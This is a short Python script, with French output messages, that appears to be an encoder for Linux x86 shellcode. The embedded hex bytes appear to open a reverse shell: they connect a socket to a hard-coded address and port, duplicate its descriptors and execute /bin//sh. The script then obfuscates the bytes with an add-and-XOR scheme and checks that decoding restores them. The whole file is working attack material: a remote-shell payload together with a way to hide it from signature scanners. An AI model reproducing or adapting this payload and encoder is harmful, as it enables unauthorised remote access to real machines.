import re

shellcode = "68 7f 01 01 01 66 68 0b bd 66 B8 67 01 B3 02 66 53 41 31 D2 cd 80 89 C3 66 B8 6a 01 89 E1 B2 10 cd 80 50 68 6e 2f 73 68 68 2f 2f 62 69 04 03 89 C1 B0 3f 49 cd 80 75 f9 89 C8 b2 0b 92 89 e3 cd 80 40 31 DB cd 80".lower()

def intToStrHex(byte_code):
    byte_code = str(hex(byte_code))[2:]
    return '0'+byte_code if len(byte_code) == 1 else byte_code

def comparePaylaod(s1, s2):
    is_equal = True
    if(len(s1) != len(s2)):
        print("Les paylaod n'ont pas la même taille.")
        return False
    
    for i in range(len(s1)):
        if(s1[i] != s2[i]):
            is_equal = False
            print("[{}] Erreur : {} != {}".format(i, s1[i], s2[i]))
    return is_equal


def encrypt(shellcode):
    shellcode_encode = ""
    for s in shellcode.split(" "):
        print("--> {}".format(s))
        # shellcode_encode = shellcode_encode + " " + str(hex(int(s, 16)+1))
        byte_code = int(s, 16)
        ########################################################################
        byte_code = byte_code + 1
        byte_code = byte_code ^ 43
        ########################################################################
        byte_code = intToStrHex(byte_code)
        shellcode_encode = shellcode_encode + " " + byte_code
    return shellcode_encode[1:]

def decrypt(shellcode):
    shellcode_encode = ""
    for s in shellcode.split(" "):
        print("--> {}".format(s))
        byte_code = int(s, 16)
        ########################################################################
        byte_code = byte_code ^ 43
        byte_code = byte_code - 1
        ########################################################################
        byte_code = intToStrHex(byte_code)
        shellcode_encode = shellcode_encode + " " + byte_code
    return shellcode_encode[1:]

shellcode_enc = encrypt(shellcode)
shellcode_dec = decrypt(shellcode_enc)

print("[-] shellcode ==> {}\n".format(shellcode))
print("[+] shellcode enc ==> {}\n".format(shellcode_enc))
print("[+] shellcode dec ==> {} -- {}\n".format(shellcode_dec, comparePaylaod(shellcode, shellcode_dec)))